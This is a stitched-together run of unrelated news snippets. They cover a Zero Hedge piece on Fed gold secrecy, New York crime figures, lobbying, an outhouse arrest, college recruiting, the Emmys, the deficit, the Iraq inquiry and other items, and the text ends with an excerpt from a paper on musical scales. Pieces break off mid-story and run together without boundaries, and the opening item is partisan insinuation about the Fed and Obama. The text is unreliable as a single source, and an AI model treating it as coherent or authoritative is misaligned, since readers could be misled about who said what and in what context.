Zero Hedge has published enough declassified documents highlighting the Fed 's desire to maintain unlimited control over the Gold market ( and also here ) , that we are certain GATA has sufficient cause and in a just court of law system will see a ruling in its favor , especially since all GATA demands is openness and transparency - a key mission of none other than President Barack Obama , who not that long ago issued the following directive :
The Freedom of Information Act should be administered with a clear presumption :
In the face of doubt , openness prevails ..... [ i ] n responding to requests under the FOIA , executive branch agencies ... should act promptly and in a spirit of cooperation , recognizing that such agencies are servants of the public .
All agencies should adopt a presumption in favor of disclosure , in order to renew their commitment to the principles embodied in FOIA , and to usher in a new era of open Government .
The presumption of disclosure should be applied to all decisions involving FOIA .
Then again , with Obama himself beholden to both the Operating and Holding company of the Federal Reserve ( we use metaphors sparingly but wisely ) , we are fairly certain that one simple phone call could abort the fair and equitable judicial process early on : after all even , gasp , Goldman bonuses could be at stake here .
Which is why we urge readers to contact their Congressmen and Senators and demand that the same kind of transparency which is applicable to all , should most certainly pertain to the one private institution whose daily actions doom America to a fate far worse than mere sovereign default .

New York ( CNN ) --
Calling a sharp drop in overall violence throughout America 's most populous city " one for the record books , " New York Mayor Michael Bloomberg announced this week that 2009 saw historic crime - rate declines across the city 's five boroughs .
The declines occurred in nearly every crime category , including the " lowest number of murders ever , " Bloomberg said Monday .
According to the mayor 's office , there have been 461 homicides to date on Monday in 2009 .
That number is down nearly 11 percent from the same time a year ago , with 516 murders recorded in 2008 .
Bloomberg said 2009 is on track to have the fewest murders in New York City 's history since reliable recordkeeping began in 1963 .
Bloomberg , with New York Police Commissioner Ray Kelly at his side , relayed the latest findings at the New York Police Department graduation ceremony for the city 's 250 newest officers .
The mayor said the drop in New York 's crime rate can be attributed to a combination of using new technologies and strong management , using statistics in police planning and responses , adequately funding the department and focusing resources to address problem areas .
Along with stringent gun laws , regulations and enforcement mechanisms , the combination of all these strategies " have helped to substantially reduce the level of violence on our streets , " Bloomberg said .
Bloomberg and Kelly called special attention to " Operation Impact , " the city 's program aimed to address particularly dangerous locales .
Started in January 2003 , the operation floods troubled areas , known as " Impact Zones , " with teams of rookie and veteran police officers .
The program has allowed the police department to mass resources to provide security for those living in high - risk locations , Kelly said .
" Police officers are saving lives in New York City every day , usually in the poorest neighborhoods , " Kelly said .
New York City had not had a year with fewer than 600 recorded murders before 2002 , but there have been eight consecutive years with fewer than 600 slayings , according to crime records .
This year also saw the 19th straight year of overall decline of major felony crimes , authorities said .
The highest spike in New York City murders came in 1990 , when 2,262 people were killed , according to the NYPD .
Since 2001 , all major crime rates in New York have declined by 35 percent , according to the police department .
Rape and robbery are down 38 percent and 34 percent , respectively .
Murders and assaults have dipped by 29 percent , according to the department .
National violent crime trends also are on the decline , according to the FBI .
The bureau released nationwide crime statistics in June for the first half of 2009 , showing a nearly 4.5 percent drop in overall violence .
Murder is down by 10 percent from a year ago across the United States , according to the FBI .
The new class of officers from Monday 's graduation joins the largest police force in the world , one with about 38,000 uniformed personnel .
" The world will be watching them start their careers , " Kelly said at Monday 's graduation .
" Their first assignment is on patrol at Times Square on New Year 's Eve . "
As the average US citizen drags his wounded semi-corpse of a body across 2009 ’s finish line , it is heartwarming and life - affirming to know that the bloodsucking lobbyists are raking it in like never before down in Washington D.C .
From Politico via the CATO Institute :
K Street is raking it in .
Washington ’s influence industry is on track to shatter last year ’s record $ 3.3 billion spent to lobby Congress and the rest of the federal government — and that ’s with a down economy and about 1,500 fewer registered lobbyists in town , according to data collected by the Center for Responsive Politics .
One giddy veteran lobbyist exclaims , “ It is the most active time that I have ever seen in the advocacy business — from 1973 on . ”
The “ advocacy business ” … lol , that ’s like “ efficiency expert ” or “ downsizing consultant ” .
Gross .
With every new social program , bailout , industry overhaul , regulatory takeover and bureacracy ’s birth , the influence peddlers see another opportunity to move and place their chips as though they ’re at a roulette table in hell .
It ’ll be Kristmas on K Street for the foreseeable future .
In the words of David Boaz , “ If you put out a picnic , you ’re going to get ants . ”

SEPTEMBER 1-- For the second time , a Maine man has been arrested for climbing down into the waste vault below an outhouse in a national park .
Gary Moody , 49 , is facing federal charges for a Memorial Day incident at a campground in the White Mountain National Forest , where he was first arrested in 2005 after being spotted in the waste vault beneath a women 's toilet ( at the time Moody claimed he dropped his wedding ring down the toilet and climbed in to the vault to retrieve it ) .
According to an affidavit filed last week in U.S. District Court in Portland , a nine - year - old boy waiting to use the bathroom noticed that " the toilet had been pulled out and was lying on the floor .
At that point a man popped out of the hole leading to the waste vault . "
After a few minutes , a " completely wet " man exited the restroom and told the boy , " Man , sorry about that , I was getting my shirt . "
After learning of the bizarre incident , federal investigators immediately suspected Moody had been in the vault " based on the extremely rare nature of this type of activity . "
When interviewed at his home , Moody admitted climbing into the vault , claiming that his shirt had fallen into the waste chamber .
Moody claimed that he had removed his shirt " and placed it on the seat of the outhouse because he thinks that outhouse seats are dirty . "
When a federal agent commented that it did not make sense to " climb into an outhouse pit if he did n't like to even sit on outhouse seats , " Moody fell silent .
When asked if he had " ever had counseling because of the outhouse problem , " Moody said no , adding that he had " anger toward society because of how he was treated after he was found in the pit of a National Forest outhouse in 2005 . "
Pictured at left in a mug shot taken after that earlier bust , Moody -- now facing three misdemeanors -- is due in federal court on September 16 for an initial appearance .

Cheney passes along a nudge for anyone who is constantly losing pens when they ask other people for their signatures .
I ’ve worked as a delivery driver for two years , and I ’ve given away countless pens in that time to customers who pay with credit cards .
True , asking for my pen back is only a minor inconvenience ( unless the customer took the receipt to the next room to sign ) .
Regardless , when I realized most of these thefts were accidental , I started to wonder if I might somehow nudge customers into giving my pens back .
What I came up with has been a definite success : I wait until the customer answers the door to remove the pen cap ( or click / twist capless pens ) .
My hypothesis is that customers seeing me briefly manipulate the pen helps cement it as mine in their minds , at least for long enough to complete the transaction .
If you ’re someone who is always losing pens because of your own absent - mindedness , you might take a tip from comedian Mitch Hedberg : “ I bought a seven - dollar pen because I always lose pens and I got sick of not caring . ”

KNOXVILLE , Tenn . --
Tennessee football coach Lane Kiffin said he takes investigations of the school 's recruiting practices as a compliment .
Kiffin said the strength of Tennessee 's recruiting class , ranked by most analysts near the top nationally , has caused the unusual amount of interest in the Volunteers ' methods , which are under investigation by the NCAA and the Southeastern Conference .
" I think when it comes to recruiting , we 're at the highest level , and I think that people really want to know what we 're doing , " Kiffin said after practice Saturday .
" They want to know how are we able to get interest from so many great players , and sign so many great players , so I think you have a lot of people coming at us . "
Kiffin confirmed a report in Friday 's New York Times that SEC officials are questioning Tennessee about an October recruiting trip to St. Thomas Aquinas High School in Fort Lauderdale , Fla. , in which Kiffin was accompanied by recruiting intern Steve Rubio , a St. Thomas Aquinas graduate and former Vols assistant coach .
Kiffin said Rubio acts as a personal assistant on some off - campus recruiting trips , but he did not think Rubio did any recruiting at the school , which would be a violation of NCAA rules .
" I know that he [ Rubio ] went in there and saw some of his old teachers and saw some of his coaches .
I do n't know that he did [ recruit ] at all , " Kiffin said .
" I never want to say never , but I will pretty much say that he did not while I was with him .
And I do n't think he could have , because they were practicing during the time that he went inside , anyway . "
Mike Hamilton , the school 's athletic director , said Tennessee took the SEC 's review , like all recruiting ethics questions , " very seriously . "
Kiffin said he assumed another SEC program turned in the potential violation , since the league office -- rather than the NCAA -- contacted Tennessee about the situation .
Meanwhile , Sports Illustrated posted a photo on its Web site Friday that shows two University of Tennessee hostesses with football recruits at a South Carolina game .
The Knoxville News Sentinel reported that the women in the photo are Lacey Earps and Dahra Johnson .
Both are members of Orange Pride , a group mostly comprised of female students which is responsible for entertaining recruits on campus visits , among other duties .
The New York Times first reported on Wednesday the women traveled nearly 200 miles to Duncan , S.C. , on Sept. 25 to watch UT commitments Brandon Willis and Corey Miller of Byrnes High School play in a game against Gaffney .
The fathers of Willis and Miller described the female Tennessee students as friends of their sons who promised in the summer they would drive down for a game .
But the visit could be interpreted by the NCAA as an illegal off - campus recruiting trip by non-sanctioned Tennessee personnel .
Kiffin has said he is not aware of any recruiting violations and has received no official inquiry from the NCAA .
Economists in the latest Wall Street Journal survey , on average , expect the Federal Reserve to raise interest rates around September 2010 , a politically sensitive time considering midterm elections will be right around the corner and unemployment is forecast to still be over 9.5 % .
The 52 surveyed economists — not all of whom answer every question — on average expect the unemployment rate to rise to 10.3 % by the end of this year from its current 10.2 % , and they expect it to stay above 9.5 % through 2010 .
The respondents expect job growth to return over the next 12 months , but the forecast calls for an average of about 50,000 jobs to be added per month over that period .
The economy needs to add about 100,000 jobs a month just to keep up with new entrants to the labor force .
" The small - business sector is still under pressure , and larger companies are still focused on bolstering current results rather than preparing for the future , " said Lou Crandall at Wrightson ICAP .
Productivity gains and cost cuts have allowed companies to boost their bottom line without adding staff .
The economists expect gross domestic product to expand around 3 % at a seasonally adjusted annual rate through 2010 , slightly slower than the 3.5 % recorded in the third quarter .
The forecast represents solid growth but remains at a level too low to add the number of jobs needed to make up for the eight million cuts recorded so far in this recession .
The last time the unemployment rate topped 10 % — in the 1980s — the following six quarters posted average growth of more than 7 % but still only managed to bring the jobless rate down by about three percentage points .
Despite the challenges , confidence is running high in the Fed to manage the economy .
Thirty of 50 economists who answered the question said that the central bank will raise interest rates at the right time , while 18 said the Fed will be too slow .
That contrasts with widespread criticism of the Fed 's timing in the past .
In the March 2008 survey , 80 % of respondents said the central bank was too slow to raise rates in 2003 , and Fed Chairman Ben Bernanke has been accused of being slow to cut rates at the start of the financial crisis .
LOS ANGELES ( Reuters ) - Actress Tina
Fey won an Emmy on Saturday for her uncanny portrayal of former Republican vice presidential nominee Sarah Palin on “ Saturday Night Live , ” while pop star Justin Timberlake also was honored for his appearance on the NBC network ’s veteran sketch - comedy series .

Both won their guest - starring awards at the creative arts portion of the Emmys , where 72 awards mostly in technical categories were handed out .
Awards in 28 high - profile races will be given out during a live broadcast on September 20 .
The Emmys are the top awards for U.S. television .
The top network was Time Warner Inc ’s HBO , which won 16 awards led by “ Grey Gardens ” and the Iraq war miniseries “ Generation Kill ” with three each .
In winning her Emmy , Fey beat out two contenders from her own NBC comedy , “ 30 Rock , ” which leads all shows with 22 nominations .
She made reference to Palin , who resigned in July as governor of Alaska less than a year after she was chosen as Senator John McCain ’s running mate in last year ’s U.S. presidential election .
“ Mrs. Palin is an inspiration to working mothers everywhere because she bailed on her job right before Fourth of July weekend .
You are living my dream .
Thank you , Mrs. Palin ! ”
It marked Fey ’s sixth career win , and she is in contention for two awards at the main ceremony , including best comedy actress .
Timberlake won his second career Emmy , this time for playing various characters on an episode of NBC ’s “ Saturday Night Live ” that he hosted .
NBC is a unit of General Electric Co .
In the dramatic categories , the guest - starring awards went to veteran actress Ellen Burstyn for NBC ’s “ Law & Order : Special Victims Unit ” and Michael J. Fox for “ Rescue Me ” on FX .
It marked Burstyn ’s first Emmy win after four nominations .
She previously won an Oscar in 1975 for “ Alice Does n’t Live Here Anymore . ”
‘ I WAS A LITTLE LACKING ’
“ It did seem like I was a little lacking in that side of the mantelpiece .
I just felt it would be balanced if I had an Emmy , too , ” said Burstyn , who appeared in the veteran crime show as the mother of series star Chris Meloni .
Fox , who was not present at the ceremony , now has five Emmys -- including three for “ Family Ties ” and one for “ Spin City . ”
In Denis Leary ’s firefighter drama “ Rescue Me , ” he played an angry , drug - abusing paraplegic .

A big winner at the ceremony was the Charles Dickens miniseries adaptation “ Little Dorrit , ” whose four wins overshadowed favored contenders “ Grey Gardens ” and “ Into the Storm . ” “ Little Dorrit ” aired on U.S. television on PBS .
By the time “ Little Dorrit ” won its fourth award , for cinematography , cameraman Lukas Strebel succinctly summed up the mood .
“ I ’m speechless and everything ’s been said , ” he said .
“ Grey Gardens , ” a TV movie based on the documentary about two socialites who love in squalor , was one of seven shows to pick up three awards .
It received 17 nominations overall , second only to “ 30 Rock , ” and remains in contention for seven awards .
“ 30 Rock ” won a pair of Emmys , and will compete for 13 at the main ceremony , including best comedy , which it won last year .
Among other big guns , defending best - drama champ “ Mad Men ” won a single award , but will hope to add up to nine awards at the main ceremony .
It airs on the AMC cable network .
“ Saturday Night Live , ” with 13 nominations , won two awards and will compete for six more Emmys .
Comedy Central ’s “ South Park ” was named best animated program ( for programing less than one hour ) for the third time , beating Fox ’s 10 - time winner “ The Simpsons . ”
The two shows have taken turns winning the prize since 2005 .
Dan Castellaneta , who voices Homer Simpson , won his fourth Emmy in the voice - over category .
Host Kathy Griffin lost in both her categories .
California first lady Maria Shriver , who was not present , won a pair of Emmys as an executive producer of two documentaries about Alzheimer ’s disease .

WASHINGTON  The Obama administration said Friday that the federal budget deficit for the fiscal year that just ended was $ 1.4 trillion , nearly a trillion dollars greater than the year before and the largest shortfall relative to the size of the economy since 1945 .
The number , while lower than forecast a few months ago , underscored the challenges ahead in shrinking the deficit even as the White House and Congress are considering more steps to stimulate an economy that is making a slow recovery .
The political hurdles to finding a solution were evident on Friday as each political party immediately blamed the other for the growth of the deficit .
The shortfall for the fiscal year 2009 , which ended Sept. 30 , translates to 10 percent of the economy , according to a joint statement from the Treasury secretary , Timothy F. Geithner , and the director of the Office of Management and Budget , Peter R. Orszag .
For the 2008 fiscal year , the deficit of $ 459 billion was 3.2 percent of the economy , as measured by the gross domestic product .
Economists generally agree that annual deficits should not exceed 3 percent of the G.D.P. , and that is the level President Obama had vowed to reach by the end of his first term in 2013 .
Cambodia has deported 20 Chinese Uighurs who had sought asylum there after fleeing ethnic riots in China 's far west region of Xinjiang in July .
The expulsions came ahead of a visit to Cambodia by the Chinese vice - president , Xi Jingping .
Witnesses said the Uighurs left on an unmarked plane from Phnom Penh 's military air field .
A government spokesman confirmed the flight was heading to China .
Earlier the authorities said the Uighurs were being deported because they had entered the country illegally .
Supporters of the Uighurs said they were fleeing persecution in China , where some had witnessed brutality by the authorities during ethnic violence in July .
A network of Christian missionaries had helped them to make their way to the Phnong Penn office of the United Nations refugee agency - the UNHRC .
The agency was still assessing the Uighurs ' claim for refugee status when armed police took them into custody on Friday .

( CNN ) -- " New Moon , " the latest film in " The Twilight Saga " is doing record business at the box office .
In its opening weekend the film grossed $ 140.7 million -- more than any other film with an autumn release in history .
The tales of teenage vampire love based on the best - selling books by Stephanie Meyer have wooed film - goers without having to resort to acres of flesh being on display .
This distinct lack of on - screen sex runs contrary to the popular trend of portraying teenagers on screen as playing fast and loose with their virginity and affections .
Love and the importance of relationships most definitely rule in " The Twilight Saga " and the formula is proving popular with audiences .
Elizabeth Morowitz , Communications Professor at the University of Missouri and author of " Bitten By Twilight " thinks that this more sensitive approach is the key to the film 's success .
" A lot of people ask ' what 's so appealing about the Twilight and why is it popular now ? ' and we think it 's because of the relationships and the messages about love in Twilight .
In a more conservative environment we 've had this push for abstinence education , so we now have a media message that 's more congruent with that .
So perhaps some teens relate to it in that way , " Morowitz told CNN 's Katie Walmsley .
The director of " New Moon " Chris Weitz says that sexual abstinence is central to the film 's appeal .
" It 's not that they can't have sex , they choose not to and I think there 's so much popular culture that 's saying to young people : ' you 'll be cool if you have sex ' or ' it 's important to be sexy ' whereas this series really concentrates on matters of the heart and spirit and I think that 's lovely , " Weitz told CNN .
A dashing male lead , in the shape of Robert Pattison does n't hurt either when you 're trying to attract a female teenage audience .
But whatever the exact recipe for its undoubted success it looks like teenagers in the " Twilight " world do n't like to bite off more than they can chew .
The White House on Monday made exceptionally clear that it wants nothing to do with the furor over documents that global warming skeptics say prove the phenomenon is not a threat .
Despite the incident , which rocked international headlines last week , climate science is sound , Press Secretary Robert Gibbs stressed this afternoon , and the White House nonetheless believes " climate change is happening . "
ADVERTISEMENT
" I do n't think that 's anything that is , quite frankly , among most people , in dispute anymore , " he said during Monday 's press briefing .
Climate change skeptics have asserted over the past week that the publication of more than 1,000 private e-mails and documents once housed in the University of East Anglia 's computer system refutes most modern global warming evidence .
The documents , unearthed by a blogger who hacked into Climate Research Unit 's ( CRU ) private system , have since touched off an international debate over the veracity of those scientists ' works .
But the dispute is proving especially troublesome for the Obama administration as it prepares to head to Copenhagen next week for a climate change summit -- a forum the president will attend .
Not only has the White House faced criticism from the left for offering too few concessions ahead of the meet , it is now fielding dissatisfaction from the right for participating in a summit sponsored in part by the U.N. Intergovernmental Panel on Climate Change ( IPCC ) -- one of the research organs touched by the CRU spat .
" I think there 's no real scientific basis for the dispute of this , " responded Gibbs to questions about those scientists ' credibility .
Nevertheless , congressional Republicans this week hope to ramp up their criticism of both global warming policy and the science that informs it .
Most vocal seems to be Sen. James Inhofe ( R - Okla . ) , the ranking member of the Environment and Public Works Committee .
Inhofe demanded on Friday a hearing into the IPCC 's research to determine whether it " cooked the science to make this thing look as if the science was settled , when all the time of course we knew it was not . "
" [ T ] his thing is serious , you think about the literally millions of dollars that have been thrown away on some of this stuff that they came out with , " he told reporters , noting it was " interesting " the e-mails surfaced before the Copenhagen summit .

LONDON — Tony Blair may have swung behind US calls for regime change in Iraq after meeting President George W. Bush at his Texas ranch in 2002 , a top diplomat told an inquiry into the war on Thursday .
Christopher Meyer , then Britain ’s ambassador to Washington , said Blair ’s line seemed to harden following talks at the Crawford ranch in April 2002 , much of which were held in private with no advisors present .
ADVERTISEMENT
He also detailed the warm personal relationship between the prime minister and US president , saying Bush could talk to Blair but saw other world leaders as “ like creatures from outer space ” .
Blair strongly backed Bush , taking Britain into the US - led invasion of Iraq in 2003 despite lack of UN Security Council approval .
He resigned in 2007 , partly due to the unpopularity of the Iraq war .
The probe heard that toppling Iraqi president Saddam Hussein was not an early priority for Bush .
Even after the September 11 , 2001 attacks by Osama bin Laden ’s Al - Qaeda network , Saddam was merely a footnote .
Meyer , ambassador to the United States from 1997 to 2003 , said he was “ not entirely clear what degree of convergence was , if you like , signed in blood at the Crawford ranch . ”
But the day after , Blair made a speech in which he publicly mentioned regime change for the first time .
ADVERTISEMENT
“ What he was trying to do was to draw the lessons of 9/11 and apply them to the situation in Iraq which led — I think not inadvertently but deliberately — to a conflation of the threat posed by Osama bin Laden and Saddam Hussein .
“ When I heard that speech , I thought that this represents a tightening of the UK / US alliance and a degree of convergence on the danger Saddam Hussein presented , ” he said .
Britain was still , though , encouraging Washington to act with the approval of the UN Security Council , Meyer said .
ADVERTISEMENT
The US position at this stage was a significant change from the Bush administration ’s early days , when Iraq was seen as being like a “ grumbling appendix ” , the retired diplomat added .
While there were concerns over Saddam , there were no plans to take action , despite calls from US hardliners like Deputy Defence Secretary Paul Wolfowitz , he said .
ADVERTISEMENT
This changed after September 11 .
On the day of the attacks , Meyer spoke to Condoleezza Rice , then US national security advisor .
“ She said : ‘ There ’s no doubt it ’s an Al - Qaeda operation ’ but at the end of the conversation , she said : ‘ We ’re just looking to see whether there could possibly be any connection with Saddam Hussein , ” he told the inquiry .
The following weekend there was a “ big ding dong ” — a major dispute — at Camp David , the US presidential retreat , when Wolfowitz “ argued very strongly ” for action against Iraq , according to Meyer .
ADVERTISEMENT
But he added : “ The decision taken that weekend was that the prime concern was with Al - Qaeda , it was with Al - Qaeda in Afghanistan , and Iraq … had to be set aside for the time being . ”
There was , though , a “ fault line ” emerging in the Bush administration between Secretary of State Colin Powell on one side and Vice President Dick Cheney and Defence Secretary Donald Rumsfeld on the other .
Talk of regime change in Iraq increased in the months before the Blair - Bush meeting at Crawford , Meyer said , adding that Britain ’s support was “ taken for granted ” by Washington .
The publication of Meyer ’s memoirs , “ DC Confidential ” , in 2005 , drew sharp criticism from some ministers and lawmakers who accused him of a lack of discretion , even though its released was approved by officials .

The inquiry , Britain ’s third related to the conflict , is looking at Britain ’s role in Iraq between 2001 and 2009 , when nearly all its troops withdrew .
It will report by the end of 2010 .
Blair will give evidence in January .

In his ruling , Judge Warren Wilbert cited a 1993 criminal trespassing case involving an abortion clinic in which the Kansas Supreme Court said that allowing a person ’s personal beliefs to justify criminal activity to stop a law - abiding citizen from exercising his rights would “ not only lead to chaos but would be tantamount to sanctioning anarchy . ”

The Iranian Embassy in Sweden was attacked Friday afternoon by masked demonstrators and at least four persons were hurt , according to reports of the Swedish television SVT .
Around 150 Iranian protesters tried to come in to the embassy in Lidingo , a peaceful and beautiful area outside the Swedish capital city Stockholm .
They threw stones to the embassy and rushed the gates , reported SVT .
Some protesters have seen that at least three of them and one person in the embassy were hurt in the chaotic process , SVT added .
" Now we have more than 50 polices here and everything is under controls , " said a Swedish police officer .
He pointed out that there were only four polices outside the embassy in the beginning of today 's demonstration .
The few police could n't prevent the chaos immediately at that time .
The demonstrations have occurred peacefully in recent days outside the embassy .

DOMESTIC air travellers face higher fares to cover the cost of airlines ' greenhouse gas emissions - estimated at $ 100 million or more - if the Federal Government 's emissions trading scheme is passed by Parliament next year , leading airlines warn .
And that , they claim , could hurt the Australian tourism industry , which employs about 500,000 people .
Domestic air travel in Australia has more than trebled over the past 20 years , with people making over 50 million trips in 2008 - 09 .
Qantas and its low - cost sibling Jetstar say by 2012 they could be looking at an extra $ 50 million to $ 60 million in emissions costs to comply with the Rudd Government 's scheme , as well as new emissions schemes in New Zealand and Europe .
Qantas ' head of corporate relations , David Epstein , said there were only two ways to deal with the cost burden : '' Either the ticket prices go up or the margins go down , reducing the viability of the routes . ''

The Egg ( l ) and its companion obtained by multibeam echosounder bathymetry
Portuguese scientists have found a depression on the Atlantic Ocean floor they think may be an impact crater .
The roughly circular , 6 km - wide hollow has a broad central dome and has been dubbed the " Fried Egg " because of its distinctive shape .
It was detected to the south of the Azores Islands during a survey to map the continental shelf .
If the Fried Egg was made by a space impactor , the collision probably took place within the past 17 million years .
Please turn on JavaScript .
Media requires JavaScript to play .
This is the likely maximum age of the basaltic sea - floor rock which harbours the feature .
" To be sure , we need to take samples and make a profile of the sediment layers to determine if there really is a central uplift from an impact , " explained Dr Frederico Dias from EMEPC ( Task Group for the Extension of the Portuguese Continental Shelf ) .
" We need also to see all the signatures that are consistent with a high velocity impact , like glasses from melting and , of course , debris ; and what are called shatter cones ( shocked rocks ) , " he told BBC News .
Central peaks
Dr Dias described the putative impact feature here at the American Geophysical Union 's ( AGU ) Fall Meeting , the world 's largest annual gathering of Earth scientists .
The Fried Egg was first identified in data gathered by a 2008 multibeam echosounder hydrographic survey .
A further cruise from September to November this year confirmed its presence .
It lies under 2 km of water about 150 km from the Azores archipelago .
The depressed ring sits roughly 110 m below the surrounding ocean bottom , with the circular dome - shaped central uplift 3 km in diameter and with a base - to - top height of some 300 m .
Central peaks are often associated with meteorite impacts and form when the compressed crater floor rebounds .
A peak is not definitive proof of an impact , however .
A volcanic origin for the Fried Egg seems unlikely because the Portuguese team has not been able to find any lava flows within the structure or on its surroundings .
Second crater
Interestingly , there is another - but much smaller - feature just 3 - 4 km to the west of the egg .
" It 's just by the side .
If the Fried Egg is a crater , this could be a crater also , " speculated Dr Dias .
Dr Dias and colleagues are examining gravity and magnetic data gathered during September 's cruise .
A third expedition to the area early next year will use a remotely operated vehicle ( ROV ) to try to retrieve samples from the ocean floor for analysis .
The Portuguese team detailed the currently available Fried Egg data on a poster at the AGU meeting .
Other researchers who came to view the information were split on the impact theory , Dr Dias said .
" Even if it 's not an impact crater it 's still a very interesting feature , " he told the BBC .
The EMEPC is working under the United Nations Convention on the Law of the Sea to establish the true extent of Portuguese territorial waters .

BATON ROUGE , La. - A Louisiana justice of the peace who refused to marry a couple because the bride is white and the groom is black resigned yesterday , after weeks of refusing to step down despite calls for his ouster from officials including the governor .
Keith Bardwell quit with a one - sentence statement to Louisiana Secretary of State Jay Dardenne and no explanation of his decision .
Governor Bobby Jindal called Bardwell ’s resignation “ long overdue . ’’
Bardwell , who is white , refused to marry Beth Humphrey and Terence McKay .
When questioned , Bardwell acknowledged he routinely avoids marrying interracial couples because he believes children born to them end up suffering .
In interviews , he said he refers the couples to other justices of the peace , who then perform the ceremony , which happened in this case .
Humphrey and McKay have filed a federal civil rights lawsuit against Bardwell .
The couple did not immediately return a call for comment .
Bardwell also did n’t immediately return a call for comment yesterday about his resignation , which followed calls for his removal from civil rights groups and several public officials , including Jindal and Senator Mary Landrieu .
“ This was the right decision by Mr. Bardwell .
What he did was clearly wrong and this resignation was long overdue , ’’ Jindal said in a statement released by his office .

Sci -fi screenwriter Dan O'Bannon , whose film credits include Alien and Total Recall , has died aged 63 .
The Writers Guild of America confirmed he passed away on Thursday in a Californian hospital .
He began his career in 1974 with the movie Dark Star , which he co-wrote with director John Carpenter .
O'Bannon continued writing sci-fi and horror pictures including Invaders from Mars , Bleeders and The Return Of The Living Dead , which he also directed .
Scales are collections of tones that divide octaves into specific intervals used to create music .
Since humans can distinguish about 240 different pitches over an octave in the mid-range of hearing [ 1 ] , in principle a very large number of tone combinations could have been used for this purpose .
Nonetheless , compositions in Western classical , folk and popular music as well as in many other musical traditions are based on a relatively small number of scales that typically comprise only five to seven tones [ 2 ] – [ 6 ] .
Why humans employ only a few of the enormous number of possible tone combinations to create music is not known .
Here we show that the component intervals of the most widely used scales throughout history and across cultures are those with the greatest overall spectral similarity to a harmonic series .
These findings suggest that humans prefer tone combinations that reflect the spectral characteristics of conspecific vocalizations .
The analysis also highlights the spectral similarity among the scales used by different cultures .
The different approach we take here is to quantitatively compare the harmonic structure that defines each interval in a possible scale to a harmonic series , rather than to consider only the intervals between fundamental frequencies and individual harmonics .
Accordingly our analysis does not depend on intervals and scales precisely mimicking a harmonic series , but evaluates degrees of similarity .
The average similarity of all intervals in the scale is then used as a measure of the overall similarity of the scale under consideration to a harmonic series .
In this way we assess whether the scales with the highest degree of similarity to a harmonic series are in fact the scales commonly used to make music .
Here we examine the possibility that the thread tying together the scales that have been preferred in music worldwide is their overall similarity to the spectral characteristics of a harmonic series .
The comparison of musical intervals to a harmonic series is not new .
Helmholtz [ 19 ] first proposed that the relative consonance of musical dyads derives from harmonic relationships of the two tones .
More recently , Bernstein [ 20 ] suggested that scale structure is determined by the appeal of the lower harmonics that occur in naturally generated harmonic series .
For example , assuming octave equivalence , the intervals between the tones of the major pentatonic scale are nearly the same as the intervals between the first nine harmonics of a harmonic series .
However , a number of flaws were later pointed out in this argument [ 14 ] .
For one thing , the last note of the major pentatonic scale only roughly approximates the seventh harmonic .
Moreover , widely used scales containing a minor second interval are not predicted , as this interval does not occur until the 15 th and 16 th harmonics of a harmonic series .
Not surprisingly , a number of investigators have grappled with the general issue of scale structure .
One approach has used consonance curves [ 11 ] to show that the consonant harmonic scale tones are defined by small integer ratios [ 12 ] , [ 13 ] .
This method has not , however , been used to predict any specific scale structures .
A different approach to understanding scales has depended on the concept of a generative grammar in linguistics , asking whether musical patterns might define a “ musical grammar ” [ 14 ] .
Again , this concept has not been applied to the prediction of preferred scale structures .
A third approach has used error minimization algorithms to predict scale structures under the assumption of competing preferences for small integer ratios and equal intervals between successive scale tones [ 15 ] , [ 16 ] .
This method can account for the structure of the equal - tempered 12 - tone chromatic scale but cannot account for any of the five to seven - tone scales commonly used to make music .
Moreover , no basis was provided for the underlying assumptions .
Other analyses have predicted scales with as many as 31 intervals , which are rarely used to make music [ 17 ] , [ 18 ] .
In short , none of these approaches explains the widespread human preference for a small number of particular scales comprising five to seven tones , or provides a biological rationale for this predilection .
The five pentatonic scales are modes of the same set of notes , the only difference being the starting note or tonic .
Seven of the nine heptatonic scales shown are also modes that entail the same notes in different arrangements ( the exceptions are the harmonic and melodic minor scales ) .
There are three unique forms of the minor heptatonic scale : the natural , harmonic and melodic ( the melodic minor scale shown is designated as ascending since this scale is identical to the natural minor scale when descending ) .
Although the scales shown begin and end on specific notes of the keyboard , each could begin on any note and retain its identity as long as all intervals between notes remained the same .
Scale tones are represented on keyboards for didactic purposes only in this and subsequent figures and should not be interpreted as being tuned in equal temperament ( see Methods ) .
The most widely employed scales ( also called modes ) in Western music over the last few centuries have been the major and minor pentatonic and heptatonic ( diatonic ) scales ( Figure 1 ) .
The other scales illustrated are commonly found in early liturgical music and , more recently , in folk music , modern jazz and some classical compositions [ 5 ] , [ 7 ] .
These same five - note and seven - note collections are also prevalent in traditional Indian , Chinese and Arabic music , although other scales are used as well [ 2 ] , [ 3 ] , [ 8 ] – [ 10 ] .
These historical facts present an obvious puzzle : given the enormous number ( billions ) of possible ways to divide octaves into five to seven tonal intervals , why have only a few scales been so strongly favored ?
Western music over the last few centuries has been based on equal temperament tuning , which developed as a compromise between the aesthetic value of maintaining justly tuned intervals ( i.e. , intervals defined by relatively small integer ratios ) and the practical need to facilitate musical composition and performance in multiple keys , especially on keyboard instruments [ 28 ] , [ 29 ] .
Just intonation is generally considered the most natural tuning system and was the system used before orchestras , composers and instrument makers demanded equal temperament ( op cit . ) .
Moreover , just intonation is used in non-Western traditions such as classical Indian music [ 3 ] , [ 22 ] – [ 24 ] .
The scales analyzed in the present study are therefore justly tuned .
The 50 pentatonic and heptatonic scales with the highest mean percentage similarity were individually compared to scales from various cultures including Western , Arabic , Indian , and East Asian .
Figure 1 shows the common Western scales used for comparison .
These same heptatonic and pentatonic scales constitute most of the basic scale structures of Indian and East Asian music , respectively [ 3 ] , [ 9 ] , [ 10 ] .
The ragas of classical Indian music are particular subsets of tones from these seven - tone “ parent ” scales or thats , and the numbers reported in the literature vary from under one hundred to thousands [ 3 ] , [ 22 ] – [ 24 ] .
Multiple different sources were used to compile a comprehensive list of over 4000 ragas for comparison with the scales shown in Tables 2 and 3 [ op cit . ] .
Arabic music uses some of the same heptatonic scales shown in Figure 1 ( e.g. , the Ajam scale is equivalent to the major scale ) in addition to uniquely Arabic scales [ 2 ] , [ 27 ] .
As with ragas , the numbers of Arabic scales reported vary ; two sources were used to compile a list of 35 for comparison [ op cit . ] .
The randomly chosen dodecatonic scales were not individually analyzed , as the chromatic scale is the only musical scale in this category .
The number of scales in any given category that we could have analyzed in theory is given by n!/(( n - k ) !*k!) where k is the number of different tones in the scale and n the number of discriminable tones over an octave in the middle range of human hearing .
If we had considered every discriminable interval over an octave as a potential scale tone , the number of possible scales would have been computationally overwhelming .
